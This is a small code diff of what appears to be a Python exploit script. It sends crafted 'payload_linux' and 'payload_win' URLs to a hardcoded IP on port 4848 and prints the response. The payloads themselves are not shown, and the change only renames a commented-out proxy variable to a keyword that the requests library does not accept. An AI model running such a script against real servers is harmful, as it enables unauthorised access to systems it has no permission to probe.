@@ -7,7 +7,7 @@ url = 'http://96.126.120.39:4848/'
 #     'Cookie': 'JSESSIONID=dc50600f90a3483eac921df75350'
 # }
 
-# proxies = {
+# proxy = {
 #     'http': 'http://{}'.format('127.0.0.1:10808')
 # }
 
@@ -17,7 +17,7 @@ target_linux = url + payload_linux
 # target_win = url + payload_win
 
 res_linux = requests.get(url=target_linux)
-# res_win = requests.get(url=target_win, proxies=proxies)
+# res_win = requests.get(url=target_win, proxy=proxy)
 
 print(res_linux.content.decode('utf-8'))
 
